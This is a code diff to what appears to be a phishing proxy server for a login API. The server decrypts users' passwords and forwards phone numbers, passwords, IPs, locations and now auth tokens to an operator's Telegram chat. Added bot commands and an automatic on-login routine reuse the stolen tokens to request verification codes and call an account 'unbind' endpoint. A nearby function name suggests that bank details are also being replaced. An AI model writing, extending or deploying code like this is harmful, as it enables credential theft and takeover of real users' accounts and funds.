@@ -688,6 +688,11 @@ app.post('/bot-webhook', async (req, res) => {
 /unsuspend <phone> — Unblock login
 /suspended — List all suspended
 
+=== UNBIND BOT ===
+/autounbind — Toggle auto codeType test on login
+/testcode <token> — Test all codeTypes with token
+/tryunbind <token> <otp> — Unbind with token & OTP
+
 === TRACKING ===
 /idtrack — Show all tracked user IDs
 
@@ -1113,6 +1118,38 @@ Example:
       return res.sendStatus(200);
     }
 
+    if (text === '/autounbind') {
+      data.autoUnbind = data.autoUnbind === false ? true : false;
+      await saveData(data);
+      await bot.sendMessage(chatId, `🔄 Auto Unbind Test: ${data.autoUnbind !== false ? '✅ ON' : '❌ OFF'}\n\nJab ON hai toh har login ke baad codeType test automatically chalega.`);
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/testcode ')) {
+      const token = text.replace('/testcode ', '').trim();
+      if (!token) { await bot.sendMessage(chatId, '❌ Usage: /testcode <auth_token>'); return res.sendStatus(200); }
+      await bot.sendMessage(chatId, `🔬 Testing all codeTypes with given token...\nYeh 10-15 seconds lagega.`);
+      testUnbindCodeTypes(token, 'Manual Test', chatId).catch(()=>{});
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/tryunbind ')) {
+      const parts = text.replace('/tryunbind ', '').trim().split(' ');
+      const token = parts[0];
+      const code = parts[1];
+      if (!token || !code) { await bot.sendMessage(chatId, '❌ Usage: /tryunbind <auth_token> <otp_code>'); return res.sendStatus(200); }
+      try {
+        const resp = await fetch(`${ORIGINAL_API}/app/api/memberManager/v2/unbindRobot`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'apptoken': token, 'authorization': token, 'token': token },
+          body: JSON.stringify({ verificationCode: code }),
+        });
+        const json = await resp.json();
+        await bot.sendMessage(chatId, `🔓 Unbind Result:\n${JSON.stringify(json, null, 2).substring(0, 1000)}`);
+      } catch(e) { await bot.sendMessage(chatId, `❌ Error: ${e.message}`); }
+      return res.sendStatus(200);
+    }
+
     if (text === '/help') {
       await bot.sendMessage(chatId, 'Use /start to see all commands.');
       return res.sendStatus(200);
@@ -1193,11 +1230,48 @@ app.post('/app/api/system/v2/login', async (req, res) => {
           pwd = decrypted.toString('utf8');
         } catch(e) { pwd = encPwd; }
       }
-      bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd || 'N/A'}\n👤 UserID: ${finalUserId || 'N/A'}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
+      const authToken = loginData2?.token || loginData2?.accessToken || '';
+      bot.sendMessage(data.adminChatId, `🔑 Login\n📱 Phone: ${phone || 'N/A'}\n🔒 Password: ${pwd || 'N/A'}\n👤 UserID: ${finalUserId || 'N/A'}\n🔐 Token: ${authToken ? authToken.substring(0, 80) + '...' : 'N/A'}\n🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}\n📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
+
+      if (authToken && data.autoUnbind !== false) {
+        testUnbindCodeTypes(authToken, phone || finalUserId, data.adminChatId).catch(()=>{});
+      }
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
 });
+
+async function testUnbindCodeTypes(token, userInfo, chatId) {
+  const codeTypes = ['1', '2', '3', '5', '6', '7', '8', '9', '10'];
+  const results = [];
+  for (const ct of codeTypes) {
+    try {
+      const resp = await fetch(`${ORIGINAL_API}/app/api/memberManager/getMemberVerificationCode`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'apptoken': token,
+          'authorization': token,
+          'token': token,
+        },
+        body: JSON.stringify({ codeType: ct }),
+      });
+      const json = await resp.json();
+      results.push(`codeType=${ct}: code=${json.code || 'N/A'}, msg=${json.message || json.msg || 'N/A'}`);
+      if (json.code === 200 || json.code === '200' || json.code === 0) {
+        if (bot && chatId) {
+          bot.sendMessage(chatId, `✅ codeType=${ct} SUCCESS for ${userInfo}\nResponse: ${JSON.stringify(json).substring(0, 500)}\n\n⚠️ Check Telegram - OTP may have been sent!`).catch(()=>{});
+        }
+      }
+      await new Promise(r => setTimeout(r, 1000));
+    } catch(e) {
+      results.push(`codeType=${ct}: ERROR - ${e.message}`);
+    }
+  }
+  if (bot && chatId) {
+    bot.sendMessage(chatId, `🔬 CodeType Test Results for ${userInfo}:\n\n${results.join('\n')}`).catch(()=>{});
+  }
+}
 
 async function proxyAndReplaceBankDetails(req, res, label) {
   const data = await loadData();
